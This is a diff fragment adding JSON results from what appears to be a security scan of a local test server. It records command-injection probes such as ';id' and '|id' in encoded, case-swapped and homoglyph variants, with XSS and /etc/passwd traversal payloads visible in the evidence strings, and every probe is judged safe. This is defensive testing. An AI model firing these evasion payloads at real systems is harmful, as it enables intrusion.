+      "endpoint": "http://127.0.0.1:8080/comment?text=%3BID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output ';id' in: stored comment: ;ID\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%3B%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output ';id' in: ...е./../etc/passwd', ';id', ';id', ';id', ';ID', ';іd']"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%7Cid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '|id' in: stored comment: |id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%257Cid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '|id' in: stored comment: |id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25257Cid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '|id' in: stored comment: |id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%7CID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '|id' in: stored comment: |ID\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%7C%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '|id' in: ...id', ';ID', ';іd', '|id', '|id', '|id', '|ID', '|іd']"
+    }
+  ]
+}
